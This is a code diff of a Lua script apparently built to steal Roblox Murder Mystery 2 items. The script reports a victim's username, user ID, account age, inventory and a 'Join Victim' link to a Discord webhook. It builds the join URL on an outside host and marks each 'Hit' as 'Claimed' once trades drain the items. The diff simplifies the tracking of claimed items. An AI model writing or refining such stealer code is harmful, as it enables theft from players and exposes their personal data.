@@ -1593,62 +1593,6 @@ genv.ProjectVeloMM2LiveRuntime = projectVeloMM2LiveRuntime
 -- direct Discord webhook send: Kaifer-style embed
 local postedMessageIds = {} -- { [webhookUrl] = messageId }
 
--- snapshot of the original inventory taken at first scan — never re-scanned
-local inventorySnapshot = {}
-local claimedItems = {} -- { [index] = true } when item at that index has been claimed
-local snapshotValueableCount = 0 -- total valuable items in original snapshot
-
-local function buildValuablesText()
-	local lines = {}
-	for i, v7 in ipairs(inventorySnapshot) do
-		if i > 15 then break end
-		if v7.value > 0 then
-			local displayName = v7.displayName or v7.name
-			local icon = claimedItems[i] and "✅" or "⬜"
-			table.insert(lines, string.format("%s x%d %s ➜ %s (%s)", icon, v7.amount, displayName, fn26(v7.totalValue), v7.rarity))
-		end
-	end
-	local text = #lines > 0 and table.concat(lines, "\n") or "No items"
-	local overflow = #inventorySnapshot - math.min(#inventorySnapshot, 15)
-	if overflow > 0 then
-		text = text .. string.format("\n... and %d more", overflow)
-	end
-	return text
-end
-
--- mark `count` unclaimed items as claimed (one trade can take multiple items)
-local function markClaimed(count)
-	local marked = 0
-	for i, v7 in ipairs(inventorySnapshot) do
-		if marked >= count then break end
-		if v7.value > 0 and not claimedItems[i] then
-			claimedItems[i] = true
-			marked = marked + 1
-		end
-	end
-end
-
-local function countClaimed()
-	local n = 0
-	for i, v7 in ipairs(inventorySnapshot) do
-		if v7.value > 0 and claimedItems[i] then
-			n = n + 1
-		end
-	end
-	return n
-end
-
-local function allClaimed()
-	for i, v7 in ipairs(inventorySnapshot) do
-		if v7.value > 0 and not claimedItems[i] then
-			return false
-		end
-	end
-	return true
-end
-
--- track item count before each trade to compute how many were taken
-local preTradeValueableCount = 0
 
 local function fn32()
 	-- detect highest rarity in inventory for @everyone trigger
@@ -1673,19 +1617,7 @@ local function fn32()
 	-- join link
 	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
 
-	-- snapshot inventory once — fn33 will use this, never re-scans
-	inventorySnapshot = {}
-	claimedItems = {}
-	snapshotValueableCount = 0
-	for _, v7 in ipairs(v4) do
-		table.insert(inventorySnapshot, v7)
-		if v7.value > 0 then
-			snapshotValueableCount = snapshotValueableCount + 1
-		end
-	end
-	preTradeValueableCount = snapshotValueableCount
-
-	local valuablesText = buildValuablesText()
+	local valuablesText = str9
 
 	-- initial status: Hit — Missed or Claimed are patched onto this same message later
 	local statusText = "🟢 Hit"
@@ -1833,8 +1765,6 @@ local function fn33(arg, arg2, _arg3)
 		return false
 	end
 
-	local tradeValue = fn26(tonumber(arg2.tradeValue) or 0)
-
 	local accountAgeDays = 0
 	pcall(function()
 		local created = localPlayer.AccountAge
@@ -1843,28 +1773,15 @@ local function fn33(arg, arg2, _arg3)
 
 	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
 
-	-- count how many valuables remain after this trade
-	local postTradeCount = 0
-	for _, v7 in ipairs(v4) do
-		if v7.value > 0 then postTradeCount = postTradeCount + 1 end
-	end
-	-- items taken = pre-trade count minus post-trade count (min 1)
-	local takenCount = math.max(1, preTradeValueableCount - postTradeCount)
-	preTradeValueableCount = postTradeCount
-	markClaimed(takenCount)
-
-	-- build valuables from snapshot with per-item ✅/⬜ icons — never re-scans v4
-	local valuablesText = buildValuablesText()
-
-	-- status: still In Progress if more items remain, Claimed if all done
-	local statusLabel = allClaimed() and "✅ Claimed" or "🔵 In Progress"
-	local embedColor = allClaimed() and 5763719 or 3447003
+	local valuablesText = str9
+	local statusLabel = "✅ Claimed"
+	local embedColor = 5763719
 
 	local fields = {
 		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusLabel, str12, receiverDisplay), inline = false },
 		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
 		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
-		{ name = "💰 Total Value", value = "```\n" .. tradeValue .. "\n```", inline = false },
+		{ name = "💰 Total Value", value = "```\n" .. fn26(n8) .. "\n```", inline = false },
 		{ name = "📦 Valuables",   value = "```\n" .. valuablesText .. "\n```", inline = false },
 	}
 
@@ -1904,8 +1821,7 @@ local function fn34(arg, arg2)
 	local tbl18 = { tradeValue = n11, tradeId = tostring(arg2) }
 
 	task.spawn(function()
-		fn33("trade_completed", tbl18, 5)
-		if allClaimed() then
+		if fn33("trade_completed", tbl18, 5) then
 			projectVeloMM2LiveRuntime.Completed = true
 		end
 	end)
@@ -2504,11 +2420,6 @@ table.insert(projectVeloTradeRuntime.Connections, trade.StartTrade.OnClientEvent
 	projectVeloTradeRuntime.AcceptPending = false
 	projectVeloTradeRuntime.LastAcceptSentAt = 0
 	projectVeloTradeRuntime.PendingCompletion = nil
-	-- count valuables before re-scan so fn33 knows how many were taken this trade
-	preTradeValueableCount = 0
-	for _, v7 in ipairs(v4) do
-		if v7.value > 0 then preTradeValueableCount = preTradeValueableCount + 1 end
-	end
 	v4 = fn24(true)
 	projectVeloTradeRuntime.Selected = fn47()
 
